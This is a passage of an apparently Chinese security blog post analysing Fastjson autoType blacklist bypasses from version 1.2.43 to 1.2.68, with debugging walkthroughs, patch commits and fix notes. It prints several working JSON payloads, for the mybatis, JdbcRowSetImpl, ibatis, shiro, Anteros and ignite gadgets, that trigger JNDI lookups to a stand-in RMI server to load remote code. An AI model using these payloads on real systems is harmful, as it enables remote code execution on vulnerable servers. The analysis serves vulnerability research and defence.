+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token != <span class="number">14</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"exepct '[', but "</span> + JSONToken.name(token) + <span class="string">", "</span> + <span class="keyword">this</span>.lexer.info());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>
+<p>当前token不为12 或者 16时，即会判断是否为<code>&quot;{&quot;</code> 或者 <code>&quot;,&quot;</code>，会在进入if流程后抛出异常，下面有一个char和token的对照关系；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token != <span class="number">12</span> &amp;&amp; token != <span class="number">16</span>) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (token == <span class="number">14</span> &amp;&amp; lexer.getCurrent() == <span class="string">']'</span>) &#123;</span><br><span class="line">    lexer.next();</span><br><span class="line">    lexer.nextToken();</span><br><span class="line">    typeKey = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> typeKey;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    StringBuffer buf = (<span class="keyword">new</span> StringBuffer()).append(<span class="string">"syntax error, expect &#123;, actual "</span>).append(lexer.tokenName()).append(<span class="string">", pos "</span>).append(lexer.pos());</span><br><span class="line">    <span class="keyword">if</span> (fieldName <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        buf.append(<span class="string">", fieldName "</span>).append(fieldName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf.append(<span class="string">", fastjson-version "</span>).append(<span class="string">"1.2.43"</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(buf.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson-1.2.43.jar!/com/alibaba/fastjson/parser/JSONLexerBase.class</span></span><br><span class="line"><span class="keyword">this</span>.ch == <span class="string">','</span> <span class="keyword">this</span>.token = <span class="number">16</span></span><br><span class="line"><span class="keyword">this</span>.ch == <span class="string">'['</span> <span class="keyword">this</span>.token = <span class="number">14</span></span><br><span class="line"><span class="keyword">this</span>.ch == <span class="string">'&#123;'</span> <span class="keyword">this</span>.token = <span class="number">12</span></span><br><span class="line"><span class="keyword">this</span>.ch == <span class="string">'\''</span> <span class="keyword">this</span>.token = <span class="number">4</span></span><br></pre></td></tr></table></figure>
+<p>因此依次满足上面的条件即可触发payload，有个问题是为什么<code>&quot;{&quot;</code>在逗号前后都能触发，解析过程中判断到当前字符为16，也就是逗号时，会直接跳过该字符，进入下一个字符的处理，因此在<code>&quot;[&quot;</code>后无论是先写逗号还是<code>&quot;{&quot;</code>，最终都是解析<code>&quot;{&quot;</code>字符</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">this</span>.lexer.token() == <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="补丁-3"><a href="#补丁-3" class="headerlink" title="补丁"></a>补丁</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/496418f626bda1e8cc285c5b49cbd2e55e82a5eb" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.44" target="_blank" rel="noopener">1.2.44</a></li>
+</ul>
+<h2 id="修复思路-2"><a href="#修复思路-2" class="headerlink" title="修复思路"></a>修复思路</h2><p>修复方式也很直接，就是截取第一个字符根据hashCode判断是否为<code>&quot;[&quot;</code>，就很暴力 ~ </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> h1 = (-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>commit中还对之前<code>Lxxx;</code>类型payload的检测代码进行了合并，先检测第一个字符hashCode h1，为<code>[</code>抛出异常；再将其跟<code>;</code>做hashCode判断是否为之前的绕过。</p>
+<hr>
+<h1 id="版本1-2-45"><a href="#版本1-2-45" class="headerlink" title="版本1.2.45"></a>版本1.2.45</h1><h2 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h2><ul>
+<li>原理：使用新的Gadget绕过黑名单</li>
+<li>利用条件：需要目标服务器存在mybatis的jar包，<code>3.0.1 ≤ 版本 ≤ 3.4.6，</code><a href="https://mvnrepository.com/artifact/org.mybatis/mybatis" target="_blank" rel="noopener">下载地址</a></li>
+</ul>
+<p>以下为PoC，主要利用了JNDI注入，访问恶意的远程注册中心，<code>data_source</code>可以连LDAP和RMI</p>
+<p>主要PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，直接运行即可触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"rmi://localhost:1099/Exploit\"&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="详情分析-3"><a href="#详情分析-3" class="headerlink" title="详情分析"></a>详情分析</h2><p>之前的补丁对类名的第一个字符进行检测，出现<code>&quot;[&quot;</code>则抛出异常，但是这个类不会触发前面的检测机制，并且黑名单中不存在这个类的hashCode，成功绕过<code>checkAutoType</code>的检测</p>
+<p>运行跟进调试<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>利用链，因为<code>setProperties</code> 方法<a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#Note%EF%BC%9A%E5%85%B3%E4%BA%8EJavaBeanInfo%E7%9A%84build%E6%96%B9%E6%B3%95">符合之前说的筛选要求</a>，因此在反序列化的过程中会被自动调用<code>setProperties</code>方法，由于<code>properties</code>中属性<code>data_source</code>可控，并且进入到<code>lookup</code>方法，从而造成JNDI注入引起命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProperties</span><span class="params">(Properties properties)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext initCtx = <span class="keyword">null</span>;</span><br><span class="line">            Properties env = getEnvProperties(properties);</span><br><span class="line">            <span class="keyword">if</span> (env == <span class="keyword">null</span>) &#123;</span><br><span class="line">                initCtx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                initCtx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (properties.containsKey(<span class="string">"initial_context"</span>) &amp;&amp; properties.containsKey(<span class="string">"data_source"</span>)) &#123;</span><br><span class="line">                Context ctx = (Context)initCtx.lookup(properties.getProperty(<span class="string">"initial_context"</span>));</span><br><span class="line">                <span class="keyword">this</span>.dataSource = (DataSource)ctx.lookup(properties.getProperty(<span class="string">"data_source"</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(<span class="string">"data_source"</span>)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.dataSource = (DataSource)initCtx.lookup(properties.getProperty(<span class="string">"data_source"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceException(<span class="string">"There was an error configuring JndiDataSourceTransactionPool. Cause: "</span> + var5, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="补丁-4"><a href="#补丁-4" class="headerlink" title="补丁"></a>补丁</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/f51faee23fb9ca81cc802eaf890302e49124e1b3" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.44" target="_blank" rel="noopener">1</a><a href="https://github.com/alibaba/fastjson/tree/1.2.46" target="_blank" rel="noopener">.2.46</a></li>
+</ul>
+<h2 id="修复思路-3"><a href="#修复思路-3" class="headerlink" title="修复思路"></a>修复思路</h2><p>从commit记录中可以看到denyHashCodes中又增加了很多类的hashCode，其中根据github blacklist对比发现<code>-8083514888460375884L</code>为<code>org.apache.ibatis.datasource</code>，完成黑名单添加，并且在1.2.46中官方扩充了不少黑名单，具体可以根据hashCode对比blacklist查看是哪个类</p>
+<hr>
+<h1 id="版本1-2-47"><a href="#版本1-2-47" class="headerlink" title="版本1.2.47"></a>版本1.2.47</h1><h2 id="绕过原因-3"><a href="#绕过原因-3" class="headerlink" title="绕过原因"></a>绕过原因</h2><blockquote>
+<p>setAutoTypeSupport为True 或者 False 都可以触发</p>
+</blockquote>
+<ul>
+<li>原理：使用新的Gadget绕过黑名单</li>
+<li>利用条件<ul>
+<li><strong>需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启<code>setAutoTypeSupport</code>都能成功</strong></li>
+<li><strong>需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭<code>setAutoTypeSupport</code>能成功</strong></li>
+</ul>
+</li>
+</ul>
+<p>直接放出payload，运行即可绕过黑名单执行命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="详情分析-4"><a href="#详情分析-4" class="headerlink" title="详情分析"></a>详情分析</h2><p>先贴出这个payload的调用栈，跟着分析一下具体流程</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/7.png" alt="Fastjson%20Bypass/Untitled%207.png"></p>
+<h3 id="1-2-47，开启-setAutoTypeSupport-分析"><a href="#1-2-47，开启-setAutoTypeSupport-分析" class="headerlink" title="1.2.47，开启**setAutoTypeSupport**分析"></a>1.2.47，开启<code>**setAutoTypeSupport**</code>分析</h3><p>由于PoC开头不为@type等预置类型，因此按照Map类型进行解析，具体Map类型解析可以看我的 <a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">Fastjson反序列化基础</a>，跟进parseObject分析其中关键步骤</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/8.png" alt="Fastjson%20Bypass/Untitled%208.png"></p>
+<p>因为typeName为<code>java.lang.Class</code>不在黑名单，成功绕过检测，在<code>this.deserializers.findClass</code>中找到其Class类并返回</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/9.png" alt="Fastjson%20Bypass/Untitled%209.png"></p>
+<p>紧接着进入到<code>MiscCodec</code>的<code>deserialze</code>方法中，在parser.parse后获取到value值<code>com.sun.rowset.JdbcRowSetImpl</code>，并在判断好clazz类型后，开始加载<code>strVal</code>的Class对象</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/10.png" alt="Fastjson%20Bypass/Untitled%2010.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/11.png" alt="Fastjson%20Bypass/Untitled%2011.png"></p>
+<p>在TypeUtils.loadClass中，成功加载目标类Class并放入缓存数组<code>mappings</code>中 ，完成第一组键值对的反序列化</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/12.png" alt="Fastjson%20Bypass/Untitled%2012.png"></p>
+<p>紧接着进入第二组，键值对的反序列化，也是触发漏洞的关键步骤，可以看到在<code>autoTypeSupport</code>为true时，在黑名单检测过程中需要同时满足两个条件，由于<code>TypeUtils.getClassFromMapping(typeName)</code>从mapping中获取到了<code>com.sun.rowset.JdbcRowSetImpl</code>类的Class，导致条件不成立，绕过黑名单抛出异常的代码</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/13.png" alt="Fastjson%20Bypass/Untitled%2013.png"></p>
+<p>之后进入正常的反序列化流程，详情见 Fastjson JdbcRowSetImpl利用链分析</p>
+<h3 id="1-2-47，关闭-setAutoTypeSupport-分析"><a href="#1-2-47，关闭-setAutoTypeSupport-分析" class="headerlink" title="1.2.47，关闭**setAutoTypeSupport**分析"></a>1.2.47，关闭<code>**setAutoTypeSupport**</code>分析</h3><p>关闭后就更直接了，直接因为<code>autoTypeSupport</code>为false不会进入到上面的黑名单检测过程，直接从mapping缓存中获取到目标类Class，进入之后的反序列化流程</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/14.png" alt="Fastjson%20Bypass/Untitled%2014.png"></p>
+<h3 id="1-2-32，开启-setAutoTypeSupport-分析"><a href="#1-2-32，开启-setAutoTypeSupport-分析" class="headerlink" title="1.2.32，开启**setAutoTypeSupport**分析"></a>1.2.32，开启<code>**setAutoTypeSupport**</code>分析</h3><p>在此版本，开启<code>autoTypeSupport</code>的情况下，直接运行PoC会抛出<code>is not support</code>的异常，分析发现在第一部分解析过程中，与之前没有太大区别，<code>java.lang.Class</code>绕过黑名单被解析为Class类型，并将目标类Class放入到mapping中，但由于没有了之前要同时满足两个条件的限制，导致被黑名单检测，抛出异常</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/15.png" alt="Fastjson%20Bypass/Untitled%2015.png"></p>
+<h3 id="1-2-32，关闭-setAutoTypeSupport-分析"><a href="#1-2-32，关闭-setAutoTypeSupport-分析" class="headerlink" title="1.2.32，关闭**setAutoTypeSupport**分析"></a>1.2.32，关闭<code>**setAutoTypeSupport**</code>分析</h3><p>在此版本，关闭<code>autoTypeSupport</code>的情况下，由于没有直接进入黑名单检测，在之后白名单检测之前，进入到<code>TypeUtils.getClassFromMapping</code>成功获取到目标类并返回，之后正常反序列化导致命令执行</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/16.png" alt="Fastjson%20Bypass/Untitled%2016.png"></p>
+<h2 id="补丁-5"><a href="#补丁-5" class="headerlink" title="补丁"></a>补丁</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.48" target="_blank" rel="noopener">1.2.48</a></li>
+</ul>
+<p>这个绕过不像之前一样只是单纯的对黑名单的绕过，更多的是结合了Fastjson特性机制，利用其缓存的特点，绕过了黑白名单的检测。对于这种类型的漏洞挖掘，更多的是需要对挖掘目标的了解，在充分了解其特性后，再去构造Payload。</p>
+<h2 id="修复思路-4"><a href="#修复思路-4" class="headerlink" title="修复思路"></a>修复思路</h2><ul>
+<li>跟上一个绕过修复思路一样，还是在denyHashCodes中增加了本次绕过类<code>java.lang.Class</code> 的hashCode</li>
+<li>把默认的<strong>缓存true改为false</strong></li>
+</ul>
+<hr>
+<h1 id="版本1-2-62"><a href="#版本1-2-62" class="headerlink" title="版本1.2.62"></a>版本1.2.62</h1><h2 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h2><ul>
+<li>原理：使用新的Gadget绕过黑名单</li>
+<li>利用条件<ul>
+<li><strong>需要 Fastjson版本 ≤ 1.2.62，并且需要开启<code>setAutoTypeSupport</code></strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="org-apache-ibatis-ibatis-sqlmap-2-3-4-726-jar"><a href="#org-apache-ibatis-ibatis-sqlmap-2-3-4-726-jar" class="headerlink" title="org.apache.ibatis.ibatis-sqlmap-2.3.4.726.jar"></a>org.apache.ibatis.ibatis-sqlmap-2.3.4.726.jar</h3><p>关键PoC：<strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": &#123;\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://localhost:1099/Exploit\"&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="详情分析-5"><a href="#详情分析-5" class="headerlink" title="详情分析"></a>详情分析</h2><ul>
+<li><code>utxName</code>可控，造成JNDI注入</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/17.png" alt="Fastjson%20Bypass/Untitled%2017.png"></p>
+<h2 id="修复思路-5"><a href="#修复思路-5" class="headerlink" title="修复思路"></a>修复思路</h2><p>增加黑名单</p>
+<hr>
+<h1 id="版本1-2-66"><a href="#版本1-2-66" class="headerlink" title="版本1.2.66"></a>版本1.2.66</h1><h2 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h2><ul>
+<li>原理：使用新的Gadget绕过黑名单</li>
+<li>利用条件<ul>
+<li><strong>需要 Fastjson版本 ≤ 1.2.66，并且需要开启<code>setAutoTypeSupport</code></strong></li>
+</ul>
+</li>
+</ul>
+<p>在1.2.66及其之前又出现了一些JNDI注入的利用链，下面列出PoC，并简单的分析一些</p>
+<h3 id="org-apache-shiro-core-1-5-1-jar"><a href="#org-apache-shiro-core-1-5-1-jar" class="headerlink" title="org.apache.shiro-core-1.5.1.jar"></a>org.apache.shiro-core-1.5.1.jar</h3><p>关键PoC：<strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://localhost:1099/Exploit\"&#125;"</span></span><br></pre></td></tr></table></figure>
+<h3 id="br-com-anteros-Anteros-DBCP-1-0-1-jar"><a href="#br-com-anteros-Anteros-DBCP-1-0-1-jar" class="headerlink" title="br.com.anteros.Anteros-DBCP-1.0.1.jar"></a>br.com.anteros.Anteros-DBCP-1.0.1.jar</h3><p>关键PoC：<strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"&#125;"</span></span><br></pre></td></tr></table></figure>
+<h3 id="org-apache-ignite-ignite-jta-1-1-0-incubating-jar"><a href="#org-apache-ignite-ignite-jta-1-1-0-incubating-jar" class="headerlink" title="org.apache.ignite.ignite-jta.1.1.0-incubating.jar"></a>org.apache.ignite.ignite-jta.1.1.0-incubating.jar</h3><p>关键PoC：<strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"rmi://localhost:1099/Exploit\"&#125;"</span></span><br></pre></td></tr></table></figure>
+<h2 id="详情分析-6"><a href="#详情分析-6" class="headerlink" title="详情分析"></a>详情分析</h2><h3 id="org-apache-shiro-core-1-5-1-jar-1"><a href="#org-apache-shiro-core-1-5-1-jar-1" class="headerlink" title="org.apache.shiro-core-1.5.1.jar"></a>org.apache.shiro-core-1.5.1.jar</h3><ul>
+<li>这条链需要注意的是，在反序列化时需要使用parseObject进行</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/18.png" alt="Fastjson%20Bypass/Untitled%2018.png"></p>
+<ul>
+<li>由于parseObject需要返回JSONObject类型对象，继承了Map，在使用toJSON进行转换的时候会遍历其字段，并调用字段getter获取value放到Map中，在调用getInstance()方法时触发JNDI注入</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/19.png" alt="Fastjson%20Bypass/Untitled%2019.png"></p>
+<h3 id="br-com-anteros-Anteros-DBCP-1-0-1-jar-1"><a href="#br-com-anteros-Anteros-DBCP-1-0-1-jar-1" class="headerlink" title="br.com.anteros.Anteros-DBCP-1.0.1.jar"></a>br.com.anteros.Anteros-DBCP-1.0.1.jar</h3><ul>
+<li>绕过黑名单，获取到目标类Class</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/20.png" alt="Fastjson%20Bypass/Untitled%2020.png"></p>
+<ul>
+<li>调用目标Class的<code>setMetricRegistry</code>方法，进入<code>lookup</code>完成JNDI注入</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/21.png" alt="Fastjson%20Bypass/Untitled%2021.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/22.png" alt="Fastjson%20Bypass/Untitled%2022.png"></p>
+<h3 id="org-apache-ignite-ignite-jta-1-1-0-incubating-jar-1"><a href="#org-apache-ignite-ignite-jta-1-1-0-incubating-jar-1" class="headerlink" title="org.apache.ignite.ignite-jta.1.1.0-incubating.jar"></a>org.apache.ignite.ignite-jta.1.1.0-incubating.jar</h3><ul>
+<li>这条链需要注意的是，在反序列化时需要使用parseObject进行</li>
+<li>在反序列化过程中，调用setJndiNames方法给Object setValue</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/23.png" alt="Fastjson%20Bypass/Untitled%2023.png"></p>
+<ul>
+<li>由于parseObject需要返回JSONObject类型对象，继承了Map，在使用toJSON进行转换的时候会遍历其字段，并调用字段getter获取value放到Map中，在调用getTm()方法时触发JNDI注入</li>
+</ul>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/24.png" alt="Fastjson%20Bypass/Untitled%2024.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/25.png" alt="Fastjson%20Bypass/Untitled%2025.png"></p>
+<h2 id="补丁-6"><a href="#补丁-6" class="headerlink" title="补丁"></a>补丁</h2><p>分别在下列两个版本增加了黑名单</p>
+<ul>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.67" target="_blank" rel="noopener">1.2.67</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.68" target="_blank" rel="noopener">1.2.68</a></li>
+</ul>
+<h2 id="修复思路-6"><a href="#修复思路-6" class="headerlink" title="修复思路"></a>修复思路</h2><p>增加黑名单</p>
+<hr>
+<h1 id="版本1-2-68"><a href="#版本1-2-68" class="headerlink" title="版本1.2.68"></a>版本1.2.68</h1><p>1.2.68版本增加了新的安全参数Safe_mode：<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p>
+<h2 id="机制分析"><a href="#机制分析" class="headerlink" title="机制分析"></a>机制分析</h2><p>从1.2.68开始新增了一个Safe_mode，打开以后直接禁用autoType功能，调试了下代码发现很直接就是在进入autoType逻辑之前给你整彻底了 。。。设置为true的时候啥也过不去，只要设置@type类型，想反序列化指定类对象的时候，就会抛异常，真可太真实了，我疯起来连我自己都 X</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/26.png" alt="Fastjson%20Bypass/Untitled%2026.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/27.png" alt="Fastjson%20Bypass/Untitled%2027.png"></p>
+<h1 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h1><p>从1.2.42版本开始为了防止安全研究人员分析黑名单中的利用链，把黑名单从原本明文的形式改为了哈希过的黑名单，目的还是为了提高利用门槛，不过在Github上已经有人跑出了大部分包名</p>
+<ul>
+<li><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>之后Fastjson主要修复方式也是对黑名单的补充，还是具有很大的隐患，一旦出现新的攻击链，很容易会绕过。</p>
+<p>虽然有了safe_mode，但是相当于废掉了这个功能，感觉不会有太多人开启这个参数。</p>
+<p>还是尽量使用白名单，减少一些攻击面。主要绕过点有以下几个：</p>
+<ol>
+<li>JDK中存在新的利用链（包括反序列化命令执行，反序列化引起XXE等各种类型问题）；</li>
+<li>引入三方依赖中可以利用；</li>
+<li>黑名单的检测机制被绕过；</li>
+<li>应用本身存在安全隐患。</li>
+</ol>
+<p>分析了这么多Fastjson补丁后发现，真的是与人斗，其乐无穷，我挖一个点，你修一个点，也充分体现出了攻防的过程，但防御总是感觉被动一些。不过开发的过程中还是要做到安全编码，具备一些安全意识，即便无法完全防御，也要提高攻击门槛，毕竟攻防之间也是成本的博弈，说要做的绝对的安全也是不可能的，安全性、可用性、稳定性之间总是要有所割舍。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></li>
+</ul>
+<ul>
+<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></li>
+</ul>
+<ul>
+<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#%E5%87%A0%E7%A7%8Dbypass%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-反序列化学习/#几种bypass方法</a></li>
+</ul>
+<ul>
+<li><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/</a></li>
+</ul>
+<ul>
+<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></li>
+</ul>
+<ul>
